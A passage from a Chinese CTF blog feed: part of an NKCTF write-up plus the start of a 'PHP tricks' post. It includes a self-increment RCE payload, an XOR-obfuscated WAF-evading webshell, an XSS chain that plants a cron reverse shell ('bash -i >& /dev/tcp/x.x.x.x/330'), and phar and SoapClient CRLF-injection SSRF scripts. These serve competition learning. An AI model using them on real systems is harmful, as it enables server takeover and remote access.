1342c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h4><p><a href="https://blog.csdn.net/qq_41904294/article/details/128838423">参考链接</a></p><p>bin目录下貌似缺一些命令，tac &#x2F;flag就可以了。</p><p>tac &#x2F;flag</p><h4 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h4><p>常见的取反~，异或^都被过滤，但是[ ]+$可以用，通过自增的方法进行RCE绕过。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//用 ___ 代替 0</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span>_<span class="token operator">/</span>_<span class="token punctuation">.</span>_<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// NAN 取 N</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// O</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">.</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// PO</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">/</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>_<span class="token punctuation">.</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// _.POST</span>$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//$_POST[___]($_POST[_])</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>去掉换行和注释即可,注意url编码。</p><p>查看phpinfo发现disable_function过滤了很多，直接readfile盲打成功。</p><p>payload:</p><pre class="line-numbers language-http"><code class="language-http">NKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=readfile&amp;_=/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h4><p>又是phar，直接复现就完事儿了。</p><p><a href="https://xz.aliyun.com/t/11798">传送门</a></p><p>因为是用新买的笔记本打的，php环境啥的都没装。修改phar.readonly浪费了俩小时的时间，尼玛php.ini的优先级竟然不是最高的。</p><h4 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h4><p>笑嘻了。环境一开始不是这样的，弱口令也不是admin。后来再开了一遍发现环境变了，访问&#x2F;dede，admin&#x2F;admin登录后台。</p><p>检索的过程中竟然发现有后台RCE漏洞，我寻思你都最高权限进后台了，直接进系统设置-&gt;其它设置把过滤的东西删了，然后进入附件设置，设置允许传入php。</p><p>有个检测一句话的waf，免杀一句话很多，随便搞一个传上去即可。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> $<span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>    <span class="token comment" spellcheck="true">// ?k=system        POST:k=cat /f1Aggg </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h4><p>访问404，群主说不需要爆破扫描，那就本地开一个小皮看一看到底有什么不一样。</p><p>小皮日志xss RCE，登录请求会被日志记录下来，加载页面会读取日志并且渲染出来，而小皮后台可以写定时任务，因此我们只要引入一个恶意xss，admin登陆进去触发xss，写入定时任务即可RCE。</p><p>后来发现少一个请求头X-Requested-With，添加上就可以了。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1679900305410.png" alt="1679900305410" style="zoom: 33%;" /><p>经过一番测试发现不是弱口令，但题目说：之后的每一天还总是登录到后台去部署服务。因此我们只要引入一个xss就好了。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  $<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=task_list'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> id<span class="token operator">=</span>data<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ID<span class="token punctuation">;</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=exec_task'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>      tid<span class="token punctuation">:</span>id    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/log.php?type=clearlog'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res3<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> data<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>task_id<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>exec_cycle<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>week<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>day<span class="token operator">=</span><span class="token string">"3"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>hour<span class="token operator">=</span><span class="token string">"15"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token string">"40"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定时任务时间设置要对</span>  data<span class="token punctuation">.</span>shell<span class="token operator">=</span><span class="token string">'bash -i >&amp; /dev/tcp/x.x.x.x/330 0>&amp;1'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//问了一下汪汪队师傅，傻逼了忘记有弹shell这个操作了，看来还是得经常打比赛。</span>  $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=save_shell'</span><span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>除了密码学其他方向应该都不难捏。</p><p>和乙组的师傅临时组的夕阳红队伍，水平应该在乙组初级~中级这个区间。比赛的时候师兄边准备开题报告边re，我们也要写作业忙科研项目，在这个时间节点能在一起讨论比赛提升技术真是太好了。希望以后每个月都能打一场捏。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的一些trick</title>
      <link href="/2023/01/16/php-fan-xu-lie-de-yi-xie-trick/"/>
      <url>/2023/01/16/php-fan-xu-lie-de-yi-xie-trick/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP的一些trick"><a href="#PHP的一些trick" class="headerlink" title="PHP的一些trick"></a>PHP的一些trick</h1><blockquote><p>会长期更新的系列，自用。</p></blockquote><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="Magic-method"><a href="#Magic-method" class="headerlink" title="Magic method"></a>Magic method</h4><ul><li>构造函数 <code>__construct</code> 对象被创建的时候调用</li><li>析构函数 <code>__destruct</code> 对象被销毁的时候调用</li><li>方法重载 <code>__call</code> 在对象中调用一个不可访问方法时调用</li><li>方法重载 <code>__callStatic</code> 在静态上下文中调用一个不可访问方法时调用</li><li>在给不可访问属性赋值时，<code>__set()</code> 会被调用。</li><li>读取不可访问属性的值时，<code>__get()</code> 会被调用。</li><li>当对不可访问属性调用 <code>isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用</li><li>当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用</li><li><code>__sleep()</code> 在<code>serialize()</code> 函数执行之前调用</li><li><code>__wakeup()</code> 在<code>unserialize()</code> 函数执行之前调用</li><li><code>__toString</code> 在一个类被当成字符串时被调用（不仅仅是echo的时候,比如file_exists()判断也会触发</li></ul><h4 id="Primitive-class"><a href="#Primitive-class" class="headerlink" title="Primitive class"></a>Primitive class</h4><p><strong>读文件名：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token string">'/f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///f*');</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///f*');</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>读文件：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h4><blockquote><p>没有unserialize()时或许可以通过phar进行反序列化。</p></blockquote><p><strong>触发phar的函数：</strong></p><table><thead><tr><th>能够利用的函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p><strong>利用phar的条件：</strong></p><p>1）phar文件要能够上传至服务器</p><p>2）要有可用的魔术方法为跳板</p><p>3）文件操作函数的参数可控，且 : 、 &#x2F; 、phar等特殊字符没有被过滤</p><p>4）php版本小于8</p><p><strong>生成phar脚本：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//生成phar.phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub，&lt;?php 前的字符无所谓，GIF89a绕过图片头</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//写入metadata</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//签名</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SoapClient-call-反序列化-CRLF打SSRF"><a href="#SoapClient-call-反序列化-CRLF打SSRF" class="headerlink" title="SoapClient::__call+反序列化+CRLF打SSRF"></a>SoapClient::__call+反序列化+CRLF打SSRF</h4><blockquote><p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化，SoapClient打SSRF比较常见。</p></blockquote><p>首先测试下正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，会去调用<code>__call</code>方法，那么<code>__call</code>方法会POST一个本地请求从而绕过本机ip校验。</p><p><strong>CRLF注入任意请求头：</strong></p><p>用安洵杯的一道题做示范。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5555/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg";</span><span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"123"</span><span class="token punctuation">,</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaaa\r\nCookie: PHPSESSID=123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"not_exists_function"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CRLF就是<code>\r\n</code>在HTTP报文中当换行用。user-agent注入Cookie成功。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676533896472.png" style="zoom:80%;" /><h5 id="CRLF注入任意POST数据"><a href="#CRLF注入任意POST数据" class="headerlink" title="CRLF注入任意POST数据"></a>CRLF注入任意POST数据</h5><p>Content-Type不是可控的，但可以通过User-Agent伪造ContentType实现任意POST请求。</p><p>注：Content-Length也需要注入。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5555/path';</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string">'data=something'</span><span class="token punctuation">;</span><span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'Cookie: PHPSESSID=123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'Squirt1e^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^Content-Length: '</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^^^'</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string">'uri'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">not_exists_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="php-session"><a href="#php-session" class="headerlink" title="php session"></a>php session</h4><p>构造器的差异造成的反序列化。</p><ul><li>ini_set(‘session.serialize_handler’,’php_serialize’);</li><li>ini_set(‘session.serialize_handler’,’php’);</li></ul><p>像这种就可控。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'baby'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'d0g3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>————————————————————————————————————————————————————————<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$a=session_start  POST: serialize_handler=pphp_serialize</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于php_serialize构造器，序列化数据前面要加个’|’。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676535834714.png"></p><p>然后使用php构造器就能反序列化了，因为php构造器分割键为’|’。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676535938182.png"></p><h3 id="可实例化类new-class-argv"><a href="#可实例化类new-class-argv" class="headerlink" title="可实例化类new $class($argv);"></a>可实例化类new $class($argv);</h3><p>如果仅仅是可实例化任意类，并且能接受参数，那么此时该如何利用呢？其实无非就是找自定义类、内置类或者扩展类。</p><h4 id="自定义类"><a href="#自定义类" class="headerlink" title="自定义类"></a>自定义类</h4><p>实例化类时会触发构造函数，那么就会触发里面的代码。如果<code>xxx</code>为可以利用的函数，那么自然可以攻击。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// xxx</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token 